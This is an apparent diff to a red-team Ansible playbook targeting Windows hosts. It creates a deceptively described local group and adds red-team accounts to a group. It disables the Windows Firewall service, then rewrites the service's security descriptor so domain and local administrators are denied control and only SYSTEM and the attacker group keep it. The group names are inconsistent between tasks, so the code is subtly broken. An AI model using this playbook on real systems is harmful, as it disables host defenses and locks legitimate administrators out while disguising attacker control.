@@ -1,9 +1,30 @@
+- name: Create group
+  community.windows.win_group:
+    name: "Firewall Administrators"
+    description: "Managed by Windows Firewall Service for kernel-level firewall administration"
+    state: present
+
+- name: Add user to group
+  community.windows.win_group_membership:
+    name: "System Managed Service Admins"
+    members:
+      - "{{ redteam_local_all }}"
+    state: present
+
+- name: Get the SID of the new group
+  ansible.windows.win_shell: |
+    (Get-LocalGroup -Name "System Managed Service Admins").SID.Value
+  register: group_sid
+
 - name: Disable Firewall Service
   # "mask" it by wiping the security descriptor so it can't be started via GUI
   ansible.windows.win_shell: |
     sc.exe stop MpsSvc
     sc.exe config MpsSvc start= disabled
-    sc.exe sdset MpsSvc 'D:(D;;DCLCWPDTSD;;;DA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLOCRRC;;;BA)'
+    $SDDL = "D:(A;;CCLCSWRPWPDTLOCRRC;;;{{ group_sid.stdout }})(A;;CCLCSWRPWPDTLOCRRC;;;SY)(D;;DCLCWPDTSD;;;DA)(D;;DCLCWPDTSD;;;BA)"
+    sc.exe sdset MpsSvc $SDDL
+  #sc.exe sdset MpsSvc 'D:(D;;DCLCWPDTSD;;;DA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLOCRRC;;;BA)'
+  ignore_errors: true
   # ^ allow localsystem, block admin/domain admin
   # block localsystem and admin:
   #sc.exe sdset MpsSvc D:(D;;DCLCWPDTSD;;;SY)(D;;DCLCWPDTSD;;;BA)
